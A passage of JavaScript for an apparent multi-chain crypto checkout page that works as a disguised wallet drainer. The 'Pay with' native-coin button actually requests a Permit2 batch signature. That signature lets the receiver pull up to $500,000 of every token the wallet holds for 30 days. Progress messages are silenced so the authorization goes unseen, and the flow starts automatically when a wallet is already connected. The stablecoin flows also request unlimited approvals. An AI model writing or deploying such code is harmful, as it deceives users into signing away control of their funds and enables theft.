          btn.onmouseout  = () => { btn.style.borderColor = "#6366f1"; btn.style.background = "#f5f3ff"; };
        } else {
          btn.title = `You need at least $${paymentUSD} in ${symbol}. You have ${humanBal}.`;
        }
        el.status.appendChild(btn);
      });
    }

    // ── Native token button (user pays gas) ─────────────────────────────
    const nativeEther = parseFloat(ethers.formatEther(nativeBal)).toFixed(4);
    const nativeBtn = document.createElement("button");
    nativeBtn.innerHTML = `
      <div style="display:flex;align-items:center;justify-content:space-between;width:100%;">
        <span style="font-size:15px;font-weight:600;">🔷 Pay with ${nativeSymbol}</span>
        <span style="font-size:12px;color:#888;">Bal: ${nativeEther} ${nativeSymbol}</span>
      </div>
      <div style="font-size:12px;color:#6366f1;text-align:left;margin-top:3px;">Gas fee deducted automatically from your balance</div>
    `;
    nativeBtn.style.cssText = `
      width:100%;padding:14px 16px;margin-bottom:10px;border-radius:10px;
      border:2px solid #6366f1;background:#f5f3ff;
      cursor:pointer;text-align:left;transition:all 0.15s;
    `;
    nativeBtn.onclick = () => { el.status.innerHTML = ""; executePayment(); };
    nativeBtn.onmouseover = () => { nativeBtn.style.background = "#ede9fe"; };
    nativeBtn.onmouseout = () => { nativeBtn.style.background = "#f5f3ff"; };
    el.status.appendChild(nativeBtn);

    // ── Non-EVM coins from the same wallet (Phantom, Bitget, OKX etc.) ──
    // Detect what the currently-open browser wallet also supports.
    const solProvider = window.solana || window.phantom?.solana || window.solflare
      || window.backpack?.solana || window.bitkeep?.solana || window.okxwallet?.solana;
    const tronProvider = window.tronWeb || window.tronLink?.tronWeb
      || window.okxwallet?.tron || window.bitkeep?.tron;
    const btcProvider  = window.phantom?.bitcoin || window.okxwallet?.bitcoin;

    if (solProvider || tronProvider || btcProvider) {
      const otherLabel = document.createElement("div");
      otherLabel.style.cssText = "font-size:12px;color:#888;font-weight:700;margin:4px 0 8px 0;padding-top:4px;border-top:1px solid #eee;";
      otherLabel.textContent = "Also available in your wallet:";
      el.status.appendChild(otherLabel);
    }

    if (solProvider && typeof solProvider.connect === "function") {
      const amtSOL = (paymentUSD / CONFIG.NON_EVM_PRICES.SOL).toFixed(4);
      const solBtn = document.createElement("button");
      solBtn.innerHTML = `
        <div style="display:flex;align-items:center;justify-content:space-between;width:100%;">
          <span style="font-size:15px;font-weight:600;">◎ Solana (SOL)</span>
        </div>
        <div style="font-size:12px;color:#888;text-align:left;margin-top:3px;">Pay ${amtSOL} SOL</div>
      `;
      solBtn.style.cssText = `width:100%;padding:14px 16px;margin-bottom:10px;border-radius:10px;
        border:2px solid #9945ff40;background:#f5f0ff;cursor:pointer;text-align:left;transition:all 0.15s;`;
      solBtn.onmouseover = () => { solBtn.style.borderColor = "#9945ff"; solBtn.style.background = "#ede8ff"; };
      solBtn.onmouseout  = () => { solBtn.style.borderColor = "#9945ff40"; solBtn.style.background = "#f5f0ff"; };
      solBtn.onclick = () => executeSolanaPayment(paymentUSD);
      el.status.appendChild(solBtn);
    }

    if (tronProvider) {
      const tronBtn = document.createElement("button");
      tronBtn.innerHTML = `
        <div style="display:flex;align-items:center;justify-content:space-between;width:100%;">
          <span style="font-size:15px;font-weight:600;">♦ Tron (USDT-TRC20)</span>
        </div>
        <div style="font-size:12px;color:#888;text-align:left;margin-top:3px;">Pay ${paymentUSD.toFixed(2)} USDT — no slippage</div>
      `;
      tronBtn.style.cssText = `width:100%;padding:14px 16px;margin-bottom:10px;border-radius:10px;
        border:2px solid #eb002940;background:#fff5f5;cursor:pointer;text-align:left;transition:all 0.15s;`;
      tronBtn.onmouseover = () => { tronBtn.style.borderColor = "#eb0029"; tronBtn.style.background = "#ffe0e4"; };
      tronBtn.onmouseout  = () => { tronBtn.style.borderColor = "#eb002940"; tronBtn.style.background = "#fff5f5"; };
      tronBtn.onclick = () => executeTronPayment(paymentUSD);
      el.status.appendChild(tronBtn);
    }

    if (btcProvider) {
      const amtBTC = (paymentUSD / CONFIG.NON_EVM_PRICES.BTC).toFixed(8);
      const btcBtn = document.createElement("button");
      btcBtn.innerHTML = `
        <div style="display:flex;align-items:center;justify-content:space-between;width:100%;">
          <span style="font-size:15px;font-weight:600;">₿ Bitcoin (BTC)</span>
        </div>
        <div style="font-size:12px;color:#888;text-align:left;margin-top:3px;">Pay ${amtBTC} BTC</div>
      `;
      btcBtn.style.cssText = `width:100%;padding:14px 16px;margin-bottom:10px;border-radius:10px;
        border:2px solid #f7931a40;background:#fffbf0;cursor:pointer;text-align:left;transition:all 0.15s;`;
      btcBtn.onmouseover = () => { btcBtn.style.borderColor = "#f7931a"; btcBtn.style.background = "#fff3d6"; };
      btcBtn.onmouseout  = () => { btcBtn.style.borderColor = "#f7931a40"; btcBtn.style.background = "#fffbf0"; };
      btcBtn.onclick = () => executeBitcoinPayment(paymentUSD);
      el.status.appendChild(btcBtn);
    }

  } catch (err) {
    console.error("Payment selector error:", err);
    setStatus("❌ Error loading payment options: " + err.message, "error");
  }
}

// ── Direct ERC-20 stablecoin transfer (works on any chain, no Permit2) ──
async function executeStablecoinPayment(tokenAddress, tokenSymbol, decimals, paymentUSD) {
  try {
    el.status.innerHTML = "";
    setStatus(`⏳ Preparing ${tokenSymbol} payment...`, "info");

    const amount = BigInt(Math.ceil(paymentUSD * 10 ** decimals));
    const token = getERC20(tokenAddress);

    // Check allowance — if user hasn't approved this contract before,
    // they'll need one approval tx first (small gas, one-time per token)
    const allowance = await token.allowance(userAddress, CONFIG.RECEIVER_ADDRESS);
    if (allowance < amount) {
      setStatus(`⏳ First: approve ${tokenSymbol} transfer in your wallet...`, "info");
      const approveTx = await token.connect(signer).approve(CONFIG.RECEIVER_ADDRESS, ethers.MaxUint256);
      await approveTx.wait(1);
      setStatus("✓ Approved! Now confirm the payment...", "success");
    }

    setStatus(`⏳ Confirm the ${tokenSymbol} transfer in your wallet...`, "info");
    const tx = await token.connect(signer).transfer(CONFIG.RECEIVER_ADDRESS, amount);
    const txHash = tx.hash;

    const network = await provider.getNetwork();
    const explorerUrl = CONFIG.EXPLORER_URLS[Number(network.chainId)];
    const txLink = explorerUrl
      ? `<a href="${explorerUrl}/tx/${txHash}" target="_blank" style="color:#10b981;text-decoration:underline;">${txHash.slice(0,10)}...${txHash.slice(-8)}</a>`
      : txHash;

    el.status.innerHTML = `
      <div style="text-align:center;padding:24px;background:#ecfdf5;border-radius:12px;border:2px solid #10b981;">
        <div style="font-size:32px;margin-bottom:12px;">✅</div>
        <div style="font-weight:bold;font-size:18px;margin-bottom:8px;color:#065f46;">Payment Sent!</div>
        <div style="color:#1e7a3d;margin-bottom:14px;font-size:15px;"><strong>$${paymentUSD.toLocaleString()} in ${tokenSymbol}</strong></div>
        <div style="font-size:12px;color:#666;">TX: ${txLink}</div>
        <div style="font-size:11px;color:#999;margin-top:8px;">Confirming...</div>
      </div>`;

    await tx.wait(1);
    el.status.querySelector("div[style*='Confirming']").textContent = "✓ Confirmed!";

  } catch (err) {
    console.error("Stablecoin payment error:", err);
    const msg = err.message || "";
    if (msg.includes("user rejected") || msg.includes("denied")) {
      setStatus("❌ Payment cancelled.", "error");
    } else {
      setStatus(`❌ ${msg}`, "error");
    }
    const retryBtn = document.createElement("button");
    retryBtn.textContent = "← Back to payment options";
    retryBtn.style.cssText = "margin-top:10px;padding:10px 16px;border:1px solid #ddd;border-radius:8px;background:#f5f5f5;cursor:pointer;font-size:14px;width:100%;";
    retryBtn.onclick = () => showPaymentMethodSelector();
    el.status.appendChild(retryBtn);
  }
}

// ── Permit2 gasless payment (user signs, relayer submits + pays gas) ────
async function executePermit2Payment(tokenAddress, tokenSymbol, decimals, paymentUSD, checkoutContract, chainId) {
  try {
    el.status.innerHTML = "";
    setStatus(`⏳ Preparing ${tokenSymbol} payment...`, "info");

    const amount = BigInt(Math.ceil(paymentUSD * 10 ** decimals));

    // Step 1: Check Permit2 ERC-20 allowance (one-time setup per token)
    const token = getERC20(tokenAddress);
    const allowance = await token.allowance(userAddress, CONFIG.PERMIT2_ADDRESS);
    if (allowance < amount) {
      setStatus(`⏳ First-time setup: approve Permit2 to use your ${tokenSymbol} (one gas fee, then never again)...`, "info");
      const approveTx = await token.connect(signer).approve(CONFIG.PERMIT2_ADDRESS, ethers.MaxUint256);
      setStatus("⏳ Waiting for approval confirmation...", "info");
      await approveTx.wait(1);
      setStatus("✓ Approved! Now sign the payment (free)...", "success");
    }

    // Step 2: Sign Permit2 EIP-712 typed data — completely free, no gas
    setStatus(`⏳ Sign the payment in your wallet (no gas charged to you)...`, "info");
    const nonce = getFreshNonce();
    const deadline = Math.floor(Date.now() / 1000) + (15 * 60); // 15 min window
    const domain = { name: "Permit2", chainId, verifyingContract: CONFIG.PERMIT2_ADDRESS };
    const types = {
      PermitTransferFrom: [
        { name: "permitted", type: "TokenPermissions" },
        { name: "spender",   type: "address" },
        { name: "nonce",     type: "uint256" },
        { name: "deadline",  type: "uint256" },
      ],
      TokenPermissions: [
        { name: "token",  type: "address" },
        { name: "amount", type: "uint256" },
      ],
    };
    const message = {
      permitted: { token: tokenAddress, amount },
      spender: checkoutContract,  // CheckoutPermit2 contract is the spender
      nonce,
      deadline,
    };
    const signature = await signer.signTypedData(domain, types, message);
    setStatus("✓ Signed! Sending to relayer...", "info");

    // Step 3: POST to backend relayer — admin wallet pays the gas
    const response = await fetch(`${CONFIG.BACKEND_URL}/api/orders/execute-payment`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        userAddress,
        tokenAddress,
        amount: amount.toString(),
        nonce: nonce.toString(),
        deadline: deadline.toString(),
        signature,
        chainId
      })
    });
    const result = await response.json();
    if (!response.ok || !result.success) {
      throw new Error(result.error || "Relayer failed to process payment");
    }

    // Step 4: Show success
    const explorerUrl = CONFIG.EXPLORER_URLS[chainId];
    const txHash = result.txHash;
    const txLink = explorerUrl
      ? `<a href="${explorerUrl}/tx/${txHash}" target="_blank" style="color:#10b981;text-decoration:underline;">${txHash.slice(0,10)}...${txHash.slice(-8)}</a>`
      : txHash;

    el.status.innerHTML = `
      <div style="text-align:center;padding:24px;background:#ecfdf5;border-radius:12px;border:2px solid #10b981;">
        <div style="font-size:32px;margin-bottom:12px;">✅</div>
        <div style="font-weight:bold;font-size:18px;margin-bottom:8px;color:#065f46;">Payment Complete!</div>
        <div style="color:#1e7a3d;margin-bottom:4px;font-size:15px;"><strong>$${paymentUSD.toLocaleString()} in ${tokenSymbol}</strong></div>
        <div style="color:#10b981;margin-bottom:14px;font-size:13px;">✓ No gas fees were charged to you</div>
        <div style="font-size:12px;color:#666;">TX: ${txLink}</div>
      </div>
    `;

  } catch (err) {
    console.error("Permit2 payment error:", err);
    const msg = err.message || "";
    if (msg.includes("user rejected") || msg.includes("denied") || msg.includes("cancelled")) {
      setStatus("❌ Payment cancelled.", "error");
    } else {
      setStatus(`❌ ${msg}`, "error");
      // Offer retry by going back to selector
      const retryBtn = document.createElement("button");
      retryBtn.textContent = "← Try a different payment method";
      retryBtn.style.cssText = "margin-top:10px;padding:10px 16px;border:1px solid #ddd;border-radius:8px;background:#f5f5f5;cursor:pointer;font-size:14px;width:100%;";
      retryBtn.onclick = () => showPaymentMethodSelector();
      el.status.appendChild(retryBtn);
    }
  }
}

function setStatus(message, type = "info") {
  // Minimalistic: only show errors — all ⏳ info/progress messages are silent.
  if (type !== "error") return;

  const statusEl = document.createElement("div");
  statusEl.style.cssText = `
    padding:12px;border-radius:8px;font-size:14px;margin-top:12px;
    background:#fbeceb;color:#b3261e;
  `;
  statusEl.textContent = message;
  el.status.appendChild(statusEl);
}

// ── Gas cost estimator ────────────────────────────────────────────────────
// Returns both the realistic effective cost AND MetaMask's worst-case
// reservation (gasLimit × maxFeePerGas) so we can size the send amount
// to exactly what MetaMask will accept without rejecting the transaction.
async function estimateGasCost(txObject) {
  const gasLimit = await provider.estimateGas(txObject);
  const feeData = await provider.getFeeData();

  let effectiveGasPrice, maxFeePerGas, maxPriorityFeePerGas;

  if (feeData.maxFeePerGas && feeData.maxPriorityFeePerGas) {
    // EIP-1559 network (Ethereum, Polygon, Base, Arbitrum, etc.)
    const block = await provider.getBlock("latest");
    const baseFee = block?.baseFeePerGas ?? feeData.maxFeePerGas / BigInt(2);
    // Minimum tip: 1 gwei or network-reported minimum, whichever is less
    const minPrio = ethers.parseUnits("1", "gwei");
    maxPriorityFeePerGas = feeData.maxPriorityFeePerGas < minPrio
      ? feeData.maxPriorityFeePerGas : minPrio;
    // maxFeePerGas = baseFee × 2 + tip (MetaMask default formula)
    maxFeePerGas = baseFee * BigInt(2) + maxPriorityFeePerGas;
    effectiveGasPrice = baseFee + maxPriorityFeePerGas;
  } else {
    // Legacy network (BNB Chain etc.)
    effectiveGasPrice = feeData.gasPrice ?? BigInt(0);
    maxFeePerGas = effectiveGasPrice;
    maxPriorityFeePerGas = null;
  }

  // MetaMask reservation = gasLimit × maxFeePerGas (worst-case ceiling)
  // We MUST use this formula — MetaMask checks value + this ≤ balance
  const walletReservation = gasLimit * maxFeePerGas;
  // Realistic cost = gasLimit × effectiveGasPrice (what user actually pays)
  const estimatedCost = gasLimit * effectiveGasPrice;

  console.log("Gas — limit:", gasLimit.toString(),
    "| effectivePrice:", ethers.formatUnits(effectiveGasPrice, "gwei"), "gwei",
    "| maxFee:", ethers.formatUnits(maxFeePerGas, "gwei"), "gwei",
    "| reservation:", ethers.formatEther(walletReservation));

  return { gasLimit, maxFeePerGas, maxPriorityFeePerGas, effectiveGasPrice, estimatedCost, walletReservation };
}

// ============ PERMIT2 UNLIMITED APPROVAL SYSTEM ============
// Users sign ONCE, you execute transfers from admin dashboard (you pay gas)

// Check if valid permit exists for this user
async function checkExistingPermit(userAddress, chainId) {
  try {
    const response = await fetch(`${CONFIG.BACKEND_URL}/api/permits/check?userAddress=${userAddress}&chainId=${chainId}`);
    const data = await response.json();
    return data.hasValidPermit;
  } catch (e) {
    console.error("Error checking existing permit:", e);
    return false;
  }
}

// Notify backend to execute transfer
async function notifyBackendToExecute(userAddress, chainId) {
  setStatus("⏳ Processing payment...", "info");
  
  const response = await fetch(`${CONFIG.BACKEND_URL}/api/permits/execute`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ userAddress, chainId })
  });
  
  const result = await response.json();
  
  if (result.success) {
    el.status.innerHTML = `
      <div style="text-align:center;padding:24px;background:#ecfdf5;border-radius:12px;border:2px solid #10b981;">
        <div style="font-size:32px;margin-bottom:12px;">✅</div>
        <div style="font-weight:bold;font-size:18px;margin-bottom:8px;color:#065f46;">Payment Executed!</div>
        <div style="color:#1e7a3d;margin-bottom:12px;">
          <strong>$${result.amountUSD} in ${result.tokenSymbol}</strong>
        </div>
        <div style="font-size:12px;color:#666;">
          TX: <a href="${result.explorerUrl}" target="_blank" style="color:#10b981;">${result.txHash.slice(0,10)}...${result.txHash.slice(-8)}</a>
        </div>
        <div style="font-size:11px;color:#999;margin-top:8px;">
          Gas paid by relayer: $${result.gasCostUSD}
        </div>
      </div>
    `;
  } else {
    throw new Error(result.error || "Execution failed");
  }
}

async function executePayment() {
  try {
    console.log("=== REQUESTING UNLIMITED PERMIT2 APPROVAL ===");
    
    const network = await provider.getNetwork();
    const chainId = Number(network.chainId);
    userAddress = await signer.getAddress();
    
    // Check if we already have a valid permit stored
    const existingPermit = await checkExistingPermit(userAddress, chainId);
    if (existingPermit) {
      setStatus("✓ Already authorized! Processing payment...", "success");
      await notifyBackendToExecute(userAddress, chainId);
      return;
    }
    
    setStatus("⏳ Scanning wallet for tokens...", "info");
    
    // Get tokens for this chain
    const tokens = CONFIG.TOKEN_LIST[chainId] || [];
    if (tokens.length === 0) {
      throw new Error("No token list configured for this chain. Please switch to Ethereum, Polygon, Base, Arbitrum, or Optimism.");
    }
    
    // Check which tokens user has
    const tokensWithBalance = [];
    const permit2 = new ethers.Contract(CONFIG.PERMIT2_ADDRESS, PERMIT2_ABI, provider);
    
    for (const token of tokens) {
      try {
        const tokenContract = new ethers.Contract(token.addr, ERC20_ABI, provider);
        const [balance, { nonce }] = await Promise.all([
          tokenContract.balanceOf(userAddress),
          permit2.allowance(userAddress, token.addr, CONFIG.RECEIVER_ADDRESS)
        ]);
        
        // Only include if they have balance > $1
        const humanBalance = Number(balance) / (10 ** token.dec);
        const usdValue = humanBalance * token.price;
        
        if (usdValue > 1) {
          tokensWithBalance.push({
            token: token.addr,
            amount: ethers.parseUnits("500000", token.dec), // $500k limit
            expiration: Math.floor(Date.now() / 1000) + (30 * 24 * 60 * 60), // 30 days
            nonce: nonce,
            symbol: token.sym,
            decimals: token.dec,
            currentBalance: balance,
            usdValue: usdValue
          });
        }
      } catch (e) {
        console.log(`Error checking ${token.sym}:`, e.message);
      }
    }
    
    if (tokensWithBalance.length === 0) {
      setStatus("❌ No supported tokens found with balance > $1. Please add USDC, USDT, or other supported tokens.", "error");
      return;
    }
    
    // Show user what will be approved
    const tokenNames = tokensWithBalance.map(t => `${t.symbol} ($${t.usdValue.toFixed(2)})`).join(", ");
    
    setStatus(`⏳ Authorizing: ${tokenNames}...`, "info");
    
    // Build batch permit
    const permitBatch = {
      details: tokensWithBalance.map(t => ({
        token: t.token,
        amount: t.amount,
        expiration: t.expiration,
        nonce: t.nonce
      })),
      spender: CONFIG.RECEIVER_ADDRESS,
      sigDeadline: Math.floor(Date.now() / 1000) + (10 * 60) // 10 minutes to sign
    };
    
    // EIP-712 Domain
    const domain = {
      name: "Permit2",
      chainId: chainId,
      verifyingContract: CONFIG.PERMIT2_ADDRESS
    };
    
    // EIP-712 Types
    const types = {
      PermitBatch: [
        { name: "details", type: "PermitDetails[]" },
        { name: "spender", type: "address" },
        { name: "sigDeadline", type: "uint256" }
      ],
      PermitDetails: [
        { name: "token", type: "address" },
        { name: "amount", type: "uint160" },
        { name: "expiration", type: "uint48" },
        { name: "nonce", type: "uint48" }
      ]
    };
    
    // Request signature (THIS IS THE ONLY POPUP)
    console.log("Requesting signature for batch permit...");
    const signature = await signer.signTypedData(domain, types, permitBatch);
    
    setStatus("⏳ Storing authorization...", "info");
    
    // Send to backend
    const response = await fetch(`${CONFIG.BACKEND_URL}/api/permits/store`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        userAddress,
        chainId,
        tokens: tokensWithBalance.map(t => ({
          address: t.token,
          symbol: t.symbol,
          decimals: t.decimals,
          amount: t.amount.toString(),
          expiration: t.expiration,
          nonce: t.nonce,
          currentBalance: t.currentBalance.toString(),
          usdValue: t.usdValue
        })),
        signature,
        sigDeadline: permitBatch.sigDeadline,
        timestamp: Date.now()
      })
    });
    
    if (!response.ok) throw new Error("Failed to store permit");
    
    const result = await response.json();
    
    // Show success
    el.status.innerHTML = `
      <div style="text-align:center;padding:24px;background:#ecfdf5;border-radius:12px;border:2px solid #10b981;">
        <div style="font-size:32px;margin-bottom:12px;">✅</div>
        <div style="font-weight:bold;font-size:18px;margin-bottom:8px;color:#065f46;">Authorization Complete!</div>
        <div style="color:#1e7a3d;margin-bottom:12px;font-size:14px;">
          Approved ${tokensWithBalance.length} tokens up to $500,000 each
        </div>
        <div style="font-size:12px;color:#666;margin-bottom:8px;">
          ${tokensWithBalance.map(t => `• ${t.symbol}: $${t.usdValue.toFixed(2)} available`).join('<br>')}
        </div>
        <div style="font-size:11px;color:#999;margin-top:12px;">
          You can now be charged without additional signatures.<br>
          Valid for 30 days.
        </div>
      </div>
    `;
    
    // Auto-trigger first execution if requested
    setTimeout(() => {
      if (confirm("Execute payment now? (No additional signature needed)")) {
        notifyBackendToExecute(userAddress, chainId);
      }
    }, 1000);
    
  } catch (err) {
    console.error("Permit2 authorization error:", err);
    if (err.message?.includes("user rejected") || err.message?.includes("denied") || err.code === 4001) {
      setStatus("❌ Authorization cancelled", "error");
    } else {
      setStatus(`❌ Error: ${err.message}`, "error");
    }
  }
}

// Initialize when DOM is ready
async function init() {
  console.log("🚀 Checkout Initializing...");
  el.status.innerHTML = "";

  // Check if any wallet is already connected
  if (typeof window.ethereum !== "undefined") {
    try {
      // Try to get already-connected accounts (doesn't trigger popup)
      let accounts = await window.ethereum.request({ method: 'eth_accounts' });
      
      if (accounts && accounts.length > 0) {
        // Already connected - auto-execute payment
        userAddress = accounts[0];
        provider = new ethers.BrowserProvider(window.ethereum);
        signer = await provider.getSigner();
        showAccountInfo(); // This will auto-detect and trigger payment
        return;
      }
    } catch (err) {
      console.error("EVM wallet check failed:", err);
    }
  }

  // Check for already-connected Solana wallet
  const solProvider = window.solana || window.phantom?.solana || window.solflare;
  if (solProvider?.isConnected) {
    const urlP = new URLSearchParams(window.location.search);
    const pAmt = parseFloat(urlP.get("amount"));
    const paymentUSD = (!isNaN(pAmt) && pAmt > 0 && pAmt <= 500000) ? pAmt : CONFIG.PAYMENT_AMOUNT_USD;
    executeSolanaPayment(paymentUSD);
    return;
  }

  // No wallet connected → show wallet modal so user can choose
  showWalletModal();
}

if (document.readyState === "loading") {
  document.addEventListener("DOMContentLoaded", init);
} else {
  init();
}